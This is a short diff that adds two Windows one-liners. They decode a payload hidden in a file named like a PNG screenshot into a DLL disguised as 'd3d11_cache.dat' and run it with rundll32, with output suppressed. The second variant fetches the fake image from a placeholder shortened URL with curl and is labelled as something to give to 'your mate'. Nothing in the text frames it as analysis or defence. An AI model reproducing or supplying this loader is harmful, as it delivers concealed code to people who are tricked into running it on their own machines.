@@ -1,0 +1,5 @@
+=== OPTION 1: LOCAL LAUNCH (From folder with Screenshot_2026-10-07_091842.png) ===
+cmd /v:on /c "set /p p=: & certutil -decode -f Screenshot_2026-10-07_091842.png %TEMP%\d3d11_cache.dat >nul 2>&1 && rundll32 %TEMP%\d3d11_cache.dat,Start !p!^|^|%CD%\Screenshot_2026-10-07_091842.png"
+
+=== OPTION 2: 1-CLICK DOWNLOAD & RUN (Give to your mate - replace YOUR_TINYURL with your direct link) ===
+cmd /v:on /c "curl -sL "YOUR_TINYURL" -o %TEMP%\p.png & certutil -decode -f %TEMP%\p.png %TEMP%\d3d11_cache.dat >nul 2>&1 && set /p p=: & rundll32 %TEMP%\d3d11_cache.dat,Start !p!^|^|%TEMP%\p.png"
